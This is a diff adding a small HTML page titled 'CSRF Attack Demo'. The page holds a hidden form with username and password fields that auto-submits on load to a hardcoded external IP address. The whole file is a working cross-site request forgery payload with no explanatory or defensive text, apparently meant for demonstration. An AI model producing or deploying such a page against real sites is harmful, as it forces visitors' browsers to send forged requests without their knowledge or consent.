@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <form id="fakeForm" action="http://159.203.10.221/csfr.php" method="POST" style="display:none;">
+        <input type="hidden" name="username" value="host">
+        <input type="hidden" name="password" value="pass">
+    </form>
+    <script>
+        window.onload = function() {
+            document.getElementById('fakeForm').submit();
+        };
+    </script>
+</body>
+</html>
